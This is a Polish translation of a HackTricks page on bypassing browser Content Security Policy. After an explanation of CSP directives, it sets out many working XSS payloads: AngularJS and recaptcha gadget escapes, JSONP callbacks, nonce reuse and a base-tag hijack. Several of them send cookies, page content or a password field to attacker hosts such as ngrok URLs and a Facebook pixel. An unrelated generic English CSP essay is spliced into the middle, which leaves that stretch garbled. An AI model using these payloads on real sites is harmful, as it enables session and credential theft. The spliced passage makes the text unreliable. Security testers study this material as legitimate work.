# Bypass zasad zabezpieczeÅ„ zawartoÅ›ci (CSP)

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**Spojrzenie na Hakowanie**\
Zanurz siÄ™ w treÅ›ciach, ktÃ³re zgÅ‚Ä™biajÄ… emocje i wyzwania hakowania

**AktualnoÅ›ci z Hakowania na Å»ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim Å›wiatem hakowania dziÄ™ki aktualnoÅ›ciom i spojrzeniom na Å¼ywo

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i istotnymi aktualizacjami platform

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## Co to jest CSP

Zasada zabezpieczeÅ„ zawartoÅ›ci (CSP) jest uznawana za technologiÄ™ przeglÄ…darki, gÅ‚Ã³wnie majÄ…cÄ… na celu **ochronÄ™ przed atakami takimi jak skrypty miÄ™dzywitrynne (XSS)**. DziaÅ‚a poprzez definiowanie i szczegÃ³Å‚owe okreÅ›lanie Å›cieÅ¼ek i ÅºrÃ³deÅ‚, z ktÃ³rych przeglÄ…darka moÅ¼e bezpiecznie Å‚adowaÄ‡ zasoby. Te zasoby obejmujÄ… rÃ³Å¼ne elementy, takie jak obrazy, ramki i JavaScript. Na przykÅ‚ad polityka moÅ¼e zezwalaÄ‡ na Å‚adowanie i wykonywanie zasobÃ³w z tego samego domeny (self), w tym zasobÃ³w wstawionych oraz wykonywanie kodu Å‚aÅ„cuchowego za pomocÄ… funkcji takich jak `eval`, `setTimeout` lub `setInterval`.

WdroÅ¼enie CSP odbywa siÄ™ poprzez **nagÅ‚Ã³wki odpowiedzi** lub poprzez **wÅ‚Ä…czenie elementÃ³w meta na stronie HTML**. Zgodnie z tÄ… politykÄ… przeglÄ…darki aktywnie egzekwujÄ… te postanowienia i natychmiast blokujÄ… wszelkie wykryte naruszenia.

* WdroÅ¼one za pomocÄ… nagÅ‚Ã³wka odpowiedzi:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* WdroÅ¼one za pomocÄ… meta tagu:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### NagÅ‚Ã³wki

CSP moÅ¼na egzekwowaÄ‡ lub monitorowaÄ‡ za pomocÄ… tych nagÅ‚Ã³wkÃ³w:

* `Content-Security-Policy`: Wymusza CSP; przeglÄ…darka blokuje wszelkie naruszenia.
* `Content-Security-Policy-Report-Only`: UÅ¼ywane do monitorowania; raportuje naruszenia bez ich blokowania. Idealne do testowania w Å›rodowiskach przedprodukcyjnych.

### Definiowanie zasobÃ³w

CSP ogranicza pochodzenie Å‚adowania zarÃ³wno aktywnych, jak i pasywnych zasobÃ³w, kontrolujÄ…c aspekty takie jak wykonanie JavaScriptu w linii oraz uÅ¼ycie `eval()`. PrzykÅ‚adowa polityka to:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Dyrektywy

* **script-src**: Pozwala na okreÅ›lenie konkretnych ÅºrÃ³deÅ‚ JavaScript, w tym adresÃ³w URL, skryptÃ³w osadzonych bezpoÅ›rednio w kodzie HTML oraz skryptÃ³w wywoÅ‚anych przez event handlery lub arkusze stylÃ³w XSLT.
* **default-src**: Ustawia domyÅ›lnÄ… politykÄ™ pobierania zasobÃ³w, gdy okreÅ›lone dyrektywy pobierania sÄ… nieobecne.
* **child-src**: OkreÅ›la dozwolone zasoby dla web workers oraz osadzonych treÅ›ci ramek.
* **connect-src**: Ogranicza adresy URL, z ktÃ³rych moÅ¼na pobieraÄ‡ zasoby za pomocÄ… interfejsÃ³w takich jak fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Ogranicza adresy URL dla ramek.
* **frame-ancestors**: OkreÅ›la, ktÃ³re ÅºrÃ³dÅ‚a mogÄ… osadzaÄ‡ bieÅ¼Ä…cÄ… stronÄ™, dotyczy elementÃ³w takich jak `<frame>`, `<iframe>`, `<object>`, `<embed>` oraz `<applet>`.
* **img-src**: Definiuje dozwolone ÅºrÃ³dÅ‚a dla obrazÃ³w.
* **font-src**: OkreÅ›la prawidÅ‚owe ÅºrÃ³dÅ‚a dla czcionek Å‚adowanych za pomocÄ… `@font-face`.
* **manifest-src**: OkreÅ›la dozwolone ÅºrÃ³dÅ‚a plikÃ³w manifestu aplikacji.
* **media-src**: Definiuje dozwolone ÅºrÃ³dÅ‚a dla Å‚adowania obiektÃ³w multimedialnych.
* **object-src**: OkreÅ›la dozwolone ÅºrÃ³dÅ‚a dla elementÃ³w `<object>`, `<embed>` oraz `<applet>`.
* **base-uri**: OkreÅ›la dozwolone adresy URL do Å‚adowania za pomocÄ… elementÃ³w `<base>`.
* **form-action**: Wymienia prawidÅ‚owe punkty koÅ„cowe dla przesyÅ‚ania formularzy.
* **plugin-types**: Ogranicza typy mime, ktÃ³re strona moÅ¼e wywoÅ‚ywaÄ‡.
* **upgrade-insecure-requests**: Nakazuje przeglÄ…darkom przepisanie adresÃ³w URL HTTP na HTTPS.
* **sandbox**: NakÅ‚ada ograniczenia podobne do atrybutu sandbox elementu `<iframe>`.
* **report-to**: OkreÅ›la grupÄ™, do ktÃ³rej zostanie wysÅ‚ane zgÅ‚oszenie w przypadku naruszenia polityki.
* **worker-src**: OkreÅ›la prawidÅ‚owe ÅºrÃ³dÅ‚a dla skryptÃ³w Worker, SharedWorker lub ServiceWorker.
* **prefetch-src**: OkreÅ›la prawidÅ‚owe ÅºrÃ³dÅ‚a dla zasobÃ³w, ktÃ³re zostanÄ… pobrane lub wczeÅ›niej pobrane.
* **navigate-to**: Ogranicza adresy URL, do ktÃ³rych dokument moÅ¼e nawigowaÄ‡ w dowolny sposÃ³b (a, form, window.location, window.open, itp.)

### Å¹rÃ³dÅ‚a

* `*`: Pozwala na wszystkie adresy URL z wyjÄ…tkiem tych z schematami `data:`, `blob:`, `filesystem:`.
* `'self'`: Pozwala na Å‚adowanie z tego samego domeny.
* `'data'`: Pozwala na Å‚adowanie zasobÃ³w za pomocÄ… schematu data (np. obrazÃ³w zakodowanych w Base64).
* `'none'`: Blokuje Å‚adowanie z dowolnego ÅºrÃ³dÅ‚a.
* `'unsafe-eval'`: Pozwala na uÅ¼ycie `eval()` i podobnych metod, niezalecane ze wzglÄ™dÃ³w bezpieczeÅ„stwa.
* `'unsafe-hashes'`: UmoÅ¼liwia okreÅ›lone inline event handlery.
* `'unsafe-inline'`: Pozwala na uÅ¼ycie zasobÃ³w osadzonych bezpoÅ›rednio, takich jak inline `<script>` lub `<style>`, niezalecane ze wzglÄ™dÃ³w bezpieczeÅ„stwa.
* `'nonce'`: BiaÅ‚a lista dla konkretnych skryptÃ³w osadzonych bezpoÅ›rednio za pomocÄ… kryptograficznego nonce (liczby uÅ¼ytej tylko raz).
* JeÅ›li wykonanie JS jest ograniczone, moÅ¼na uzyskaÄ‡ uÅ¼yty nonce na stronie za pomocÄ… `doc.defaultView.top.document.querySelector("[nonce]")` i nastÄ™pnie ponownie go wykorzystaÄ‡ do Å‚adowania zÅ‚oÅ›liwego skryptu (jeÅ›li uÅ¼ywane jest strict-dynamic, dowolne dozwolone ÅºrÃ³dÅ‚o moÅ¼e Å‚adowaÄ‡ nowe ÅºrÃ³dÅ‚a, wiÄ™c nie jest to konieczne), jak w:

<details>

<summary>Åadowanie skryptu ponownie wykorzystujÄ…c nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: BiaÅ‚e listy skryptÃ³w z okreÅ›lonym haszem sha256.
* `'strict-dynamic'`: UmoÅ¼liwia Å‚adowanie skryptÃ³w z dowolnego ÅºrÃ³dÅ‚a, jeÅ›li zostaÅ‚y dodane do biaÅ‚ej listy za pomocÄ… nonce lub hasha.
* `'host'`: OkreÅ›la okreÅ›lony host, np. `example.com`.
* `https:`: Ogranicza adresy URL do tych, ktÃ³re uÅ¼ywajÄ… protokoÅ‚u HTTPS.
* `blob:`: UmoÅ¼liwia Å‚adowanie zasobÃ³w z adresÃ³w URL Blob (np. adresÃ³w URL Blob utworzonych za pomocÄ… JavaScript).
* `filesystem:`: UmoÅ¼liwia Å‚adowanie zasobÃ³w z systemu plikÃ³w.
* `'report-sample'`: Zawiera przykÅ‚ad naruszajÄ…cego kodu w raporcie naruszeÅ„ (przydatne do debugowania).
* `'strict-origin'`: Podobnie jak 'self', ale zapewnia, Å¼e poziom zabezpieczeÅ„ protokoÅ‚u ÅºrÃ³deÅ‚ odpowiada dokumentowi (tylko bezpieczne ÅºrÃ³dÅ‚a mogÄ… Å‚adowaÄ‡ zasoby z bezpiecznych ÅºrÃ³deÅ‚).
* `'strict-origin-when-cross-origin'`: WysyÅ‚a peÅ‚ne adresy URL podczas wykonywania Å¼Ä…daÅ„ o tym samym pochodzeniu, ale wysyÅ‚a tylko pochodzenie, gdy Å¼Ä…danie jest miÄ™dzy pochodzeniami.
* `'unsafe-allow-redirects'`: UmoÅ¼liwia Å‚adowanie zasobÃ³w, ktÃ³re natychmiast przekierujÄ… do innego zasobu. Nie zaleca siÄ™, poniewaÅ¼ osÅ‚abia to bezpieczeÅ„stwo.

## Niebezpieczne zasady CSP

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
PracujÄ…cy Å‚adunek: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' za pomocÄ… ramek

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

{% hint style="danger" %}
To nie dziaÅ‚a, aby uzyskaÄ‡ wiÄ™cej informacji [**sprawdÅº to**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
{% endhint %}
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
DziaÅ‚ajÄ…cy Å‚adunek:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

JeÅ›li w jakiÅ› sposÃ³b moÅ¼esz sprawiÄ‡, aby **dozwolony kod JS utworzyÅ‚ nowy tag skryptu** w DOM za pomocÄ… swojego kodu JS, poniewaÅ¼ dozwolony skrypt go tworzy, **nowy tag skryptu bÄ™dzie mÃ³gÅ‚ zostaÄ‡ wykonany**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
DziaÅ‚ajÄ…cy Å‚adunek:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Brak object-src i default-src

{% hint style="danger" %}
**WyglÄ…da na to, Å¼e to juÅ¼ nie dziaÅ‚a**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
DziaÅ‚ajÄ…ce Å‚adunki:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### PrzesyÅ‚anie plikÃ³w + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
JeÅ›li moÅ¼esz przesÅ‚aÄ‡ plik JS, moÅ¼esz ominÄ…Ä‡ tÄ™ CSP:

DziaÅ‚ajÄ…cy payload:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
JednakÅ¼e jest bardzo prawdopodobne, Å¼e serwer **sprawdza przesÅ‚any plik** i pozwoli Ci tylko **przesÅ‚aÄ‡ okreÅ›lony rodzaj plikÃ³w**.

Co wiÄ™cej, nawet jeÅ›li udaÅ‚oby Ci siÄ™ przesÅ‚aÄ‡ **kod JS wewnÄ…trz** pliku za pomocÄ… akceptowanego przez serwer rozszerzenia (np. _script.png_), to nie wystarczy, poniewaÅ¼ niektÃ³re serwery, jak serwer apache, **wybierajÄ… typ MIME pliku na podstawie rozszerzenia**, a przeglÄ…darki, jak Chrome, **odmÃ³wiÄ… wykonania kodu Javascript** w czymÅ›, co powinno byÄ‡ obrazem. "Na szczÄ™Å›cie" sÄ… bÅ‚Ä™dy. Na przykÅ‚ad, z CTF dowiedziaÅ‚em siÄ™, Å¼e **Apache nie rozpoznaje** rozszerzenia _**.wave**_, dlatego nie serwuje go z typem MIME takim jak audio/\*.

StÄ…d, jeÅ›li znajdziesz XSS i moÅ¼liwoÅ›Ä‡ przesÅ‚ania pliku, oraz uda Ci siÄ™ znaleÅºÄ‡ **bÅ‚Ä™dne rozszerzenie**, moÅ¼esz sprÃ³bowaÄ‡ przesÅ‚aÄ‡ plik z tym rozszerzeniem i zawartoÅ›ciÄ… skryptu. Lub, jeÅ›li serwer sprawdza poprawny format przesÅ‚anego pliku, stwÃ³rz poliglot ([kilka przykÅ‚adÃ³w poliglotÃ³w tutaj](https://github.com/Polydet/polyglot-database)).

### Form-action

JeÅ›li nie jest moÅ¼liwe wstrzykniÄ™cie JS, nadal moÅ¼esz sprÃ³bowaÄ‡ np. wydobyÄ‡ dane, **wstrzykujÄ…c akcjÄ™ formularza** (i byÄ‡ moÅ¼e liczÄ…c na automatyczne wypeÅ‚nienie haseÅ‚ przez menedÅ¼ery haseÅ‚). MoÅ¼esz znaleÅºÄ‡ [**przykÅ‚ad w tym raporcie**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). ZauwaÅ¼ takÅ¼e, Å¼e `default-src` nie obejmuje dziaÅ‚aÅ„ formularza.

### ZewnÄ™trzne punkty koÅ„cowe + ('unsafe-eval')

{% hint style="warning" %}
Dla niektÃ³rych z poniÅ¼szych Å‚adunkÃ³w **`unsafe-eval` nie jest nawet potrzebne**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
ZaÅ‚aduj podatnÄ… wersjÄ™ angulara i wykonaj dowolny kod JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloady wykorzystujÄ…ce Angular + bibliotekÄ™ z funkcjami zwracajÄ…cymi obiekt `window` ([sprawdÅº ten post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
W poÅ›cie pokazano, Å¼e moÅ¼na **zaÅ‚adowaÄ‡** wszystkie **biblioteki** z `cdn.cloudflare.com` (lub dowolnego innego repozytorium zezwolonych bibliotek JS), wykonaÄ‡ wszystkie dodane funkcje z kaÅ¼dej biblioteki i sprawdziÄ‡, **ktÃ³re funkcje z ktÃ³rych bibliotek zwracajÄ… obiekt `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
### Angular XSS z nazwy klasy:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### NaduÅ¼ywanie kodu JS google recaptcha

Zgodnie z [**tym opisem CTF**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) moÅ¼na naduÅ¼yÄ‡ [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) wewnÄ…trz CSP, aby wykonaÄ‡ dowolny kod JS omijajÄ…c CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
WiÄ™cej [**payloadÃ³w z tego wpisu**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### Wykorzystywanie www.google.com do otwartego przekierowania

NastÄ™pujÄ…cy adres URL przekierowuje na example.com (z [tutaj](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
### Trzecie punkty koÅ„cowe + JSONP

MoÅ¼liwe jest naduÅ¼ycie Google Apps Script w celu otrzymywania informacji na stronie wewnÄ…trz script.google.com. Tak jak to [zostaÅ‚o wykonane w tym raporcie](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Scenariusze, w ktÃ³rych `script-src` jest ustawiony na `self` i okreÅ›lona domena jest dodana do biaÅ‚ej listy, moÅ¼na obejÅ›Ä‡, korzystajÄ…c z JSONP. Punkty koÅ„cowe JSONP pozwalajÄ… na niezabezpieczone metody wywoÅ‚aÅ„ zwrotnych, co umoÅ¼liwia atakujÄ…cemu wykonanie XSS, dziaÅ‚ajÄ…cy Å‚adunek:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **zawiera gotowe do uÅ¼ycia punkty koÅ„cowe JSONP do obejÅ›cia CSP na rÃ³Å¼nych stronach internetowych.**

Ta sama podatnoÅ›Ä‡ wystÄ…pi, jeÅ›li **zaufany punkt koÅ„cowy zawiera Przekierowanie Otwarte**, poniewaÅ¼ jeÅ›li poczÄ…tkowy punkt koÅ„cowy jest zaufany, to przekierowania sÄ… uznawane za zaufane.

### NaduÅ¼ycia osÃ³b trzecich

Jak opisano w [poniÅ¼szym poÅ›cie](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), istnieje wiele domen osÃ³b trzecich, ktÃ³re mogÄ… byÄ‡ dozwolone gdzieÅ› w CSP, mogÄ… byÄ‡ wykorzystane do eksfiltracji danych lub wykonania kodu JavaScript. NiektÃ³re z tych stron osÃ³b trzecich to:

| Podmiot           | Dozwolona Domena                             | ZdolnoÅ›ci    |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Eksfiltracja |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Eksfiltracja |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Wykonanie    |
| Amazon CloudFront | \*.cloudfront.net                            | Eksfiltracja, Wykonanie |
| Amazon AWS        | \*.amazonaws.com                             | Eksfiltracja, Wykonanie |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Eksfiltracja, Wykonanie |
| Salesforce Heroku | \*.herokuapp.com                             | Eksfiltracja, Wykonanie |
| Google Firebase   | \*.firebaseapp.com                           | Eksfiltracja, Wykonanie |

JeÅ›li znajdziesz ktÃ³rÄ…Å› z dozwolonych domen w CSP swojego celu, istnieje szansa, Å¼e bÄ™dziesz w stanie obejÅ›Ä‡ CSP, rejestrujÄ…c siÄ™ w usÅ‚udze osÃ³b trzecich i albo eksfiltrujÄ…c dane do tej usÅ‚ugi, albo wykonujÄ…c kod.

Na przykÅ‚ad, jeÅ›li znajdziesz nastÄ™pujÄ…cy CSP:
```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```
# Bypassing Content Security Policy (CSP)

## Introduction

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, such as Cross Site Scripting (XSS) and data injection attacks. However, in some cases, it can be bypassed using various techniques.

## Bypassing CSP using `unsafe-inline`

One common way to bypass CSP is by using the `unsafe-inline` keyword in the CSP header. This allows the execution of inline scripts and styles, which can be exploited by an attacker to execute malicious code.

To bypass CSP using `unsafe-inline`, an attacker can inject their payload directly into the HTML code, allowing the browser to execute it despite the CSP policy.

## Bypassing CSP using `unsafe-eval`

Another way to bypass CSP is by using the `unsafe-eval` keyword in the CSP header. This allows the execution of dynamic code evaluation through functions like `eval()`, which can also be abused by attackers.

By leveraging `unsafe-eval`, an attacker can execute arbitrary code by injecting it into functions that are later evaluated by the browser.

## Conclusion

While CSP is a powerful security mechanism, it is important to understand how it can be bypassed in order to effectively protect web applications against attacks. By being aware of these bypass techniques, developers can implement stronger security measures to prevent exploitation.
```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```
1. UtwÃ³rz konto dewelopera na Facebooku [tutaj](https://developers.facebook.com/).
2. StwÃ³rz nowÄ… aplikacjÄ™ "Facebook Login" i wybierz "Strona internetowa".
3. PrzejdÅº do "Ustawienia -> Podstawowe" i uzyskaj "ID aplikacji".
4. Na stronie docelowej, z ktÃ³rej chcesz wyciekaÄ‡ dane, moÅ¼esz to zrobiÄ‡ bezpoÅ›rednio za pomocÄ… gadÅ¼etu Facebook SDK "fbq" poprzez "customEvent" i Å‚adunek danych.
5. PrzejdÅº do "MenedÅ¼era zdarzeÅ„" aplikacji i wybierz utworzonÄ… aplikacjÄ™ (zauwaÅ¼, Å¼e menedÅ¼er zdarzeÅ„ moÅ¼na znaleÅºÄ‡ pod adresem URL podobnym do: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events).
6. Wybierz zakÅ‚adkÄ™ "Test Events", aby zobaczyÄ‡ zdarzenia wysyÅ‚ane przez TwojÄ… witrynÄ™.

NastÄ™pnie, po stronie ofiary, wykonaj poniÅ¼szy kod, aby zainicjowaÄ‡ piksel Å›ledzenia Facebooka, ktÃ³ry bÄ™dzie wskazywaÅ‚ na aplikacjÄ™ dewelopera atakujÄ…cego o podanym ID aplikacji i wydaÅ‚ zdarzenie niestandardowe:
```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```
### Bypass za pomocÄ… RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

OprÃ³cz wspomnianej wczeÅ›niej przekierowania w celu ominiÄ™cia ograniczeÅ„ Å›cieÅ¼ki istnieje inna technika o nazwie Relative Path Overwrite (RPO), ktÃ³ra moÅ¼e byÄ‡ uÅ¼yta na niektÃ³rych serwerach.

Na przykÅ‚ad, jeÅ›li CSP zezwala na Å›cieÅ¼kÄ™ `https://example.com/scripts/react/`, moÅ¼na jÄ… ominÄ…Ä‡ w nastÄ™pujÄ…cy sposÃ³b:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
PrzeglÄ…darka ostatecznie zaÅ‚aduje `https://example.com/scripts/angular/angular.js`.

To dziaÅ‚a, poniewaÅ¼ dla przeglÄ…darki Å‚adowany jest plik o nazwie `..%2fangular%2fangular.js` znajdujÄ…cy siÄ™ w `https://example.com/scripts/react/`, co jest zgodne z CSP.

NastÄ™pnie zdekodujÄ… to, efektywnie Å¼Ä…dajÄ…c `https://example.com/scripts/react/../angular/angular.js`, co jest rÃ³wnowaÅ¼ne z `https://example.com/scripts/angular/angular.js`.

WykorzystujÄ…c tÄ™ niekonsekwencjÄ™ w interpretacji adresÃ³w URL miÄ™dzy przeglÄ…darkÄ… a serwerem, reguÅ‚y Å›cieÅ¼ki mogÄ… zostaÄ‡ obejÅ›cia.

RozwiÄ…zaniem jest nie traktowanie `%2f` jako `/` po stronie serwera, zapewniajÄ…c spÃ³jnÄ… interpretacjÄ™ miÄ™dzy przeglÄ…darkÄ… a serwerem, aby uniknÄ…Ä‡ tego problemu.

PrzykÅ‚ad online:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Wykonywanie JS w ramkach

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### brakujÄ…cy **base-uri**

JeÅ›li dyrektywa **base-uri** jest pominiÄ™ta, moÅ¼na jÄ… wykorzystaÄ‡ do wykonania [**wstrzykniÄ™cia zawieszonego znacznika**](../dangling-markup-html-scriptless-injection/).

Co wiÄ™cej, jeÅ›li **strona Å‚aduje skrypt za pomocÄ… Å›cieÅ¼ki wzglÄ™dnej** (jak `<script src="/js/app.js">`) uÅ¼ywajÄ…c **Nonce**, moÅ¼na wykorzystaÄ‡ tag **base** do **Å‚adowania** skryptu z **wÅ‚asnego serwera osiÄ…gajÄ…c XSS.**\
JeÅ›li podatna strona jest Å‚adowana z **httpS**, uÅ¼yj adresu URL httpS w tagu base.
```html
<base href="https://www.attacker.com/">
```
### Wydarzenia AngularJS

